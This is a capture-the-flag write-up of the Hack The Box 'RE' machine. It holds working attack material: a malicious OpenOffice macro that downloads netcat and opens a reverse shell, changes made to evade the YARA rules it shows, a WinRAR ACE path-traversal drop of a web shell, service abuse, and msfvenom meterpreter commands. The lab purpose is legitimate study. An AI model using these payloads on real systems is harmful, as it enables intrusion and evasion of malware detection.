# RE-walktrough
A writeup about the htb RE box

## Introduction
This [box](https://www.hackthebox.eu/home/machines/profile/198) from htb was very realstic, the social engineer part was awesome.
Thanks to [0xdf](https://www.hackthebox.eu/home/users/profile/4935) for his great work.

## Enumeation
I use masscan and nmap for a quick scan, here i use a script which create a keepnote page report from the scan, found it [here](https://github.com/roughiz/EnumNeTKeepNoteReportCreator/blob/master/keepNoteScanNetReportCreator.sh).
 
In my first enumeration we can see, smb share, and http(80) ports :
```
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-methods: 
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Visit reblog.htb
445/tcp open microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
First i look into smb share, with smbmap :
```
$ smbmap  -u anonymous -H 10.10.10.144      
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.144...
[+] IP: 10.10.10.144:445	Name: 10.10.10.144                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	IPC$                                              	READ ONLY
	malware_dropbox                                   	READ ONLY
```

Let's Read what we have into "malware_dropbox", but it's empty.

### Web site 

![redirect](https://github.com/roughiz/RE-walktrough/blob/master/redirect.png)

Let's take a look into the http site, the site redirect us to "http://reblog.htb/" , we have to add this subdomaine to hosts file '/etc/hosts'  like:
##### 10.10.10.144     reblog.htb

### Users
In the path : "http://reblog.htb/2019/03/10/accounts.html" and "http://reblog.htb/2019/03/15/ghidra.html" i found some usernames:

![blog](https://github.com/roughiz/RE-walktrough/blob/master/blog.png)

###### coby
######  Kenny

I found nothing intersting in the site, let's try to see if we have any other subdomaine for (reblog.htb and re.htb)  with wfuzz :
```
$ wfuzz  --hh  311 -H 'Host: FUZZ.reblog.htb' -c -w SecLists/Discovery/DNS/fierce-hostlist.txt -u reblog.htb
```

But nothing. let's try with re.htb, firstly with browser we have a page with the text "Please check back soon for re.htb updates." , mmm we can surelly find something here, let's scan subdomains first like :
```
$ wfuzz --hh 311  -H 'Host: FUZZ.re.htb' -c -w /home/roughiz/MyGit/SecLists/Discovery/DNS/fierce-hostlist.txt -u re.htb
```
Nothing but in souce code, we have this comment :
```
<!--future capability
	<p> To upload Ghidra project:
	<ol>
	  <li> exe should be at project root.Directory stucture should look something like:
	      <code><pre>
|   vulnerserver.gpr
|   vulnserver.exe
\---vulnerserver.rep
    |   project.prp
    |   projectState
    |
    +---idata
    |   |   ~index.bak
    |   |   ~index.dat
    |   |
    |   \---00
    |       |   00000000.prp
    |       |
    |       \---~00000000.db
    |               db.2.gbf
    |               db.3.gbf
    |
    +---user
    |       ~index.dat
    |
    \---versioned
            ~index.bak
            ~index.dat
		  </pre></code>
	  </li>
	  <li>Add entire directory into zip archive.</li>
	  <li> Upload zip here:</li>
    </ol> -->
```
Perhaps we can found a path to upload a file ...
At this moment, i tried many things but nothing work. so i return to the site and read all the blog articles, and i understand that the SOC have some phishing attempts with ods attatchements.
And it appears that they analyse theses files with yara, to detect any malware... 

#### Yara 
Is a tool that allows you to write rules to identify, organize, and classify similar files. This is particularly useful to malware analysts, who want to gather various samples that share certain characteristics to analyze together. The tool will scan through a file or directory of files with a provided rule and identify any files that match the patterns in the rule.

Ok the idea here is to upload an ods file, in this file we have a macro with a payload. But this file should pass the yara rules analyse.

In the blog we have a link, how yara analyse an odt created by metasploit. so i followed how to modify my ods exploit file.

##### Nota: smbmap shows that "malware_dropbox"  share is Read Only, but when i tried i can write into, so i will put my exploit here.

### Create the ods file with metasploit :
I use "openoffice_document_macro" to create the .ods file
```
msf5 > use exploit/multi/misc/openoffice_document_macro
msf5 exploit(multi/misc/openoffice_document_macro) > options

Module options (exploit/multi/misc/openoffice_document_macro):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BODY                                 no            The message for the document body
   FILENAME  msf.ods           yes          The OpoenOffice Text document name
   SRVHOST   0.0.0.0             yes          The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT   80                yes          The local port to listen on.
   SSL       false                     no            Negotiate SSL for incoming connections
   SSLCert                             no            Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no           The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.10        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache OpenOffice on Windows (PSH)
```
On running, it will generate a document with a macro. That macro contains code that executes a PowerShell downloader, which reaches back to my Kali box and downloads the rest of the payload, in this case, Meterpreter.

### Generate Document
I’ll run this to generate the document and start the listener.
```
msf5 exploit(multi/misc/openoffice_document_macro) > [*] Using URL: http://0.0.0.0:80/Pc2F6ndgt1H5jGs
[*] Local IP: http://10.1.1.41:80/Pc2F6ndgt1H5jGs
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2                                                                                                           
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging file: manifest.rdf
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
[*] Packaging file: Basic/script-lc.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: meta.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
[*] Packaging file: META-INF/manifest.xml
[*] Packaging file: content.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging file: mimetype
[*] Packaging file: styles.xml
[*] Packaging file: settings.xml
[+] msf.odt stored at /root/.msf4/local/msf.ods
```
Now we can exit metasploit copy the .ods document, to modify it. 
### OpenDocument Format
The OpenDocument Format can be unzipped the same way. If I rename a .ods file to .zip, and unzip, I get:
``` 
$ 7z x msf.ods
```
And the zip content : 
```
├── Basic
│   ├── Standard
│   │   ├── Module1.xml
│   │   └── script-lb.xml
│   └── script-lc.xml
├── Configurations2
│   └── accelerator
│       └── current.xml
├── META-INF
│   └── manifest.xml
├── Thumbnails
│   └── thumbnail.png
├── content.xml
├── manifest.rdf
├── meta.xml
├── mimetype
├── settings.xml
└── styles.xml
```
The "Module1.xml" has the macro code, and i have to change the file name, functions and vars names, and  also the shell() command to bypass yara rules like: 
### Default Module1.xml file :
```
Sub OnLoad
      Dim os as string
      os = GetOS
      If os = "windows" OR os = "osx" OR os = "linux" Then
        Exploit
      end If
    End Sub

    Sub Exploit
      Shell("cmd.exe /C ""powershell.exe -nop -w hidden -c $i=new-object net.webclient;$i.proxy=[Net.WebRequest]::GetSystemWebProxy();$i.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $i.downloadstring('http://10.1.1.41:8088/Pc2F6ndgt1H5jGs');""";)
    End Sub

    Function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "windows"
        case 3:
          GetOS = "osx"
        case 4:
          GetOS = "linux"
      end select
    End Function

    Function GetExtName() as string
      select case GetOS
        case "windows"
          GetFileName = "exe"
        case else
          GetFileName = "bin"
      end select
    End Function
```
### The file Finnally looks like: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="UnModule" script:language="StarBasic">REM  *****  BASIC  *****
    Sub YesLOad
      Dim ooos as string
      ooos = GeetTheOOS
      If ooos = &quot;windows&quot; OR ooos = &quot;osx&quot; OR ooos = &quot;linux&quot; Then
        MyExploit
      end If
    End Sub

    Sub MyExploit
      Shell(&quot;cmd.exe /C &quot;&quot;curl -o C:\Users\Public\Music\ncc.exe http://10.10.14.10/nc.exe &amp;&amp; C:\Users\Public\Music\ncc.exe 10.10.14.10 443 -e cmd.exe&quot;&quot;&quot;)
    End Sub

    Function GeetTheOOS() as string
      select case   getGUIType
        case 1:
          GeetTheOOS = &quot;windows&quot;
        case 3:
          GeetTheOOS = &quot;osx&quot;
        case 4:
          GeetTheOOS = &quot;linux&quot;
      end select
    End Function

    Function GetExtName() as string
      select case GeetTheOOS
        case &quot;windows&quot;
          GetFileName = &quot;exe&quot;
        case else
          GetFileName = &quot;bin&quot;
      end select
    End Function
    
</script:module>
```
At the end we zip the content of the directory like :
```
$ 7z a msf.ods *
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-6500U CPU @ 2.50GHz (406E3),ASM,AES-NI)

Open archive: ../msf.ods
--
Path = msf.ods
Type = zip
Physical Size = 8880

Scanning the drive:
6 folders, 12 files, 28703 bytes (29 KiB)

Updating archive: ../msf.ods

Items to compress: 18

    
Files read from disk: 12
Archive size: 8881 bytes (9 KiB)
Everything is Ok

```

## Shell as luke 
After putting the msf.ods file into //10.10.10.144/malware_dropbox,
```
$ smbclient  //10.10.10.144/malware_dropbox -Uanonymous
Unable to initialize messaging context
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> put msf.ods 
putting file msf.ods as \msf.ods (117,2 kb/s) (average 117,2 kb/s)
```

We have a shell as luke 
```
$ whoami
re\luke
type \Users\luke\desktop\user.txt 
FE41736F5B9311E48E48B520D9F3****
```

And in the \Users\luke\documents\ we have the ods.yara rules 
```
$ type ods.yara
type ods.yara
rule metasploit 
{
        strings:
	        $getos = "select case getGUIType" nocase wide ascii
			$getext = "select case GetOS" nocase wide ascii
			$func1 = "Sub OnLoad" nocase wide ascii
			$func2 = "Sub Exploit" nocase wide ascii
			$func3 = "Function GetOS() as string" nocase wide ascii
			$func4 = "Function GetExtName() as string" nocase wide ascii
			
		condition:
		    (all of ($get*) or 2 of ($func*))
}

rule powershell
{
        strings:
			$psh1  = "powershell" nocase wide ascii
			$psh2  = "new-object" nocase wide ascii
			$psh3  = "net.webclient" nocase wide ascii
			$psh4  = "downloadstring" nocase wide ascii
			$psh5  = "downloadfile" nocase wide ascii
			$psh6  = "iex" nocase wide ascii
			$psh7  = "-e" nocase wide ascii
			$psh8  = "iwr" nocase wide ascii
			$psh9  = "-outfile" nocase wide ascii
			$psh10 = "invoke-exp" nocase wide ascii
			
		condition:
		    2 of ($psh*)
}

rule cmd
{
        strings:
		    $cmd1 = "cmd /c" nocase wide ascii
			$cmd2 = "cmd /k" nocase wide ascii
		condition:
            any of ($cmd*)
}
```
## Privilege Escalation
In my road to escalate the privilege, i find a powershell script "process_samples.ps1" which analyse the .ods file with yara and also  store it in a directory
```
$ cat process_samples.ps1.ps1

$process_dir = "C:\Users\luke\Documents\malware_process"
$files_to_analyze = "C:\Users\luke\Documents\ods"
$yara = "C:\Users\luke\Documents\yara64.exe"
$rule = "C:\Users\luke\Documents\ods.yara"

while($true) {
	# Get new samples
	move C:\Users\luke\Documents\malware_dropbox\* $process_dir

	# copy each ods to zip file
	Get-ChildItem $process_dir -Filter *.ods | 
	Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}

	Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {
		
		# unzip archive to get access to content
		$unzipdir = Join-Path $_.directory $_.Basename
		New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
		Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir
		
		# yara to look for known malware
		$yara_out = & $yara -r $rule $unzipdir
		$ods_name = $_.fullname -replace ".zip", ".ods"
		if ($yara_out.length -gt 0) {
			Remove-Item $ods_name
		}
	}
	# if any ods files left, make sure they launch, and then archive:
	$files = ls $process_dir\*.ods
	if ( $files.length -gt 0) { 
		# launch ods files
		Invoke-Item "C:\Users\luke\Documents\malware_process\*.ods"
		Start-Sleep -s 5
		
		# kill open office, sleep
		Stop-Process -Name soffice*
		Start-Sleep -s 5
		
		#& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null
		Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"
		$hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
		# Upstream processing may expect rars. Rename to .rar
		Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar	
	}
	Remove-Item -Recurse -force -Path $process_dir\*
	Start-Sleep -s 5
}
```
If we look at the lines in the end about the .zip(.ods) moving to $files_to_analyze\$hash.rar with new name (their md5 hash) and with extension (.rar) 

Maybe and according to notes in the blog , an other user use this file.

I tried a manual test with putting a ".rar" file into "C:\Users\luke\Documents\ods" directory,  file disapear after some seconds it's like an other process use it.

### Extracting Code Execution From Winrar

After many research i found that winrar < 5.70 , is [vulnerable](https://research.checkpoint.com/extracting-code-execution-from-winrar/) if used ACE files. When extracting an archive we can execute an Absolute Path Traversal.
So we can place an evil ".rar" file in "\Users\luke\documents\ods\" in the box, i found a python [script](https://github.com/manulqwerty/Evil-WinRAR-Gen) which generate a malicious winrar file with the evil, good files and the destination path like:

Firstly i tried to place the evil file in "\Users\public\Music", to see if it works, like :
```
$ evilWinRAR.py -o test.rar -e test.txt  -g  ../my.jpeg -p 'C:\Users\Public\Music\'
```
I put the test.rar in "\Users\luke\documents\ods\", And it works :

![winrar1](https://github.com/roughiz/RE-walktrough/blob/master/win1.png)

We can see that the user who unrar the archive is "cam".

![winrar2](https://github.com/roughiz/RE-walktrough/blob/master/win2.png)

Now i'm sure that the vuln works but how can i exec it, the idea is to upload an aspx command shell in the web path in the box (\inetpub\wwwroot\blog\about\) and execute it later at "http://reblog.htb/about/cmd.aspx", like :
```
$ evilWinRAR.py -o exploit.rar -e cmd.aspx  -g  ../my.jpeg -p 'C:\inetpub\wwwroot\blog\about\'
```
###### Nota : php/asp shell dosen't works 

![php](https://github.com/roughiz/RE-walktrough/blob/master/php.png)

Finnally an .aspx command shell from [SecLists](https://github.com/danielmiessler/SecLists)  works great: ~/SecLists/Web-Shells/FuzzDB/cmd.aspx

![cmd_aspx](https://github.com/roughiz/RE-walktrough/blob/master/cmd.png)

### Shell as "iis apppool"
From the web command, i have a new shell as "iis apppool"

![aspx_cmd](https://github.com/roughiz/RE-walktrough/blob/master/iis_shell.png)

With this new user, i tried to enumerate with a powershell [script](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) POwerUp.ps1. And i found that we can abuse a service configuration. From powershell i load the script like :
```
. .\PowerUp.ps1
Invoke-AllChecks
.....
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```
Here the script tell us that we can use "Invoke-ServiceAbuse -Name 'UsoSvc'" , it will abuse the service "UsoSvc"configuration file rights, and create a ǹew user with admin rights, but i prefer to execute a command to have a new shell like :
We can do it like  : 
```
$ Invoke-ServiceAbuse -Name 'UsoSvc' -Command "C:\Users\Public\Music\nc.exe 10.10.14.10 5555 -e cmd"
ServiceAbused Command                                            
------------- -------                                            
UsoSvc        C:\Users\Public\Music\ncc.exe 10.10.14.10 5555 -e cmd
```
###### Nota: we have to execute a new rev shell with the shell caught with "Invoke-ServiceAbuse", because the first one will exit (the service can't start!!) 

### Shell as system

![system](https://github.com/roughiz/RE-walktrough/blob/master/system.png)

Now i tried to read the root.txt flag but i can't !! 
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.
```
It appears that this file is encrypted with EFS (Encyption File System), so to open it we have to authenticate as the user which encrypted it. And to know it i use command "cipher" like :
```
cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    RE\Administrator [Administrator(Administrator@RE)]
    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D 

    coby(coby@RE)
    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

We can see that only "Administrator" and "coby" users can decrypt this file let's try to have a meterpreter rev shell and impersonnate a user coby process like :

Firstly i create a meterpreter rev shell with msfvenom, and execute it from the box :
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=6060 -f exe -o met.exe
```

We have to find a process which run by "coby" and impersonnate it like :

![meterpreter](https://github.com/roughiz/RE-walktrough/blob/master/meterpreter.png)

## Root dance

![flagroot](https://github.com/roughiz/RE-walktrough/blob/master/flagroot.png)


## digging into the box 

As coby we can read the script process_projects.ps1 which running by coby and we can understand that the script  search into "C:\proj_drop" for a zip file, and open it with ghidra, this archive should follow the format like weseen before in the comment in the "re.htb/re" page.
From here we can also have a shell as coby if we create a zip with a rev shell executable in the root directory, and use Winrar exploit to put it in "C:\proj_drop".
```
cat process_projects.ps1 
$dropbox = "C:\proj_drop"
$proj_dir = "C:\users\coby\ghidra_projects\import"
$ghidra_bat = "C:\users\coby\ghidra_9.0\ghidraRun.bat"
$ghidra_config = "C:\Users\coby\.ghidra\.ghidra-9.0\preferences"
while ($true) {
	Get-ChildItem $dropbox | ForEach-Object {

		if ($_.Extension -eq ".zip") {

            Remove-Item $proj_dir\* -Recurse -Force

            Expand-Archive -LiteralPath $_.fullname -DestinationPath $proj_dir
		
		    # get project name
		    Get-ChildItem -Path $proj_dir -filter *.rep | ForEach-Object {
				$proj_name = $_.name -replace ".rep",""
				$last_open = "LastOpenedProject=$proj_dir\$proj_name"
                $proj_prp = '{0}\{1}.rep\project.prp' -f $proj_dir, $proj_name
                if([System.IO.File]::Exists($proj_prp)) {
		
		            #replace name in $ghidra config
		            Get-Content $ghidra_config | findstr /v LastOpenedProject | Set-Content $ghidra_config
		            (echo $last_open) -replace "\\","\\" | Out-File -encoding ASCII -append $ghidra_config
					
					# run project
		            $ghidra = Start-Process -passthru $ghidra_bat
		            Start-Sleep 50
		            stop-process -force -name javaw
                }
            }
		}

		Remove-Item -Path $_.fullname
		
	}

	Start-Sleep 2
```

And from cam user , the process_rars.ps1 script which permit the winrar ACE exploit : 
```
cat process_rars.ps1
$source = "\users\luke\documents\ods"
$process_dir = "\users\cam\documents\ods_rars\"
$queue_dir = "\users\cam\documents\ods_queue\"


Set-Location $queue_dir

while($true) {

    move "$source\*" $process_dir

	Get-ChildItem $process_dir -Filter *.rar | ForEach-Object {

		# Since we were forced by IT to uninstall WinRar, this will do
		# what we used to do with WinRar to extract rar files that are
		# zips, rar, or ace.
		$bytes = [char[]][System.IO.File]::ReadAllBytes($_.fullname)
		
		# unzip
		$zip_magic = -join $bytes[0..1]
		if ($zip_magic -eq "PK") {
			$zip = $_.fullname -replace "\.rar", ".zip"
			Copy-Item -Path $_.fullname -Destination $zip -force
			Expand-Archive -Path $zip -DestinationPath $queue_dir -force
			Remove-Item -Path $zip
		}
		
		# unrar
		$rar_magic = -join $bytes[0..3]
		if ($rar_magic -eq "Rar!") {
			& 'C:\Program Files\PeaZip\res\unrar\unrar.exe' x -o+ $_.fullname
		}
		
		# unace
		$ace_magic = -join $bytes[7..13]
		if ($ace_magic -eq "**ACE**") {
			# unace won't overwrite, but will hang
			$files = & 'C:\Program Files\PeaZip\res\unace\unace.exe' l $_.fullname
			($files | Select-String -pattern 'Found ([\w:\\\. ]+)  \(').matches.groups | ForEach-Object {
				if ($_.name % 2 -eq 1) {
                    echo "removing $($_.value)"
					Remove-Item $_.value -ErrorAction SilentlyContinue
				}
			}
			Start-Process -FilePath 'C:\Program Files\PeaZip\res\unace\unace.exe' -ArgumentList "x",$_.fullname # -redirectstandardoutput stdout.txt -redirectstandarderror stderr.txt
		}
	}

    Start-Sleep 3
	
	Remove-Item "$process_dir\*"
	
	Start-Sleep 10
```
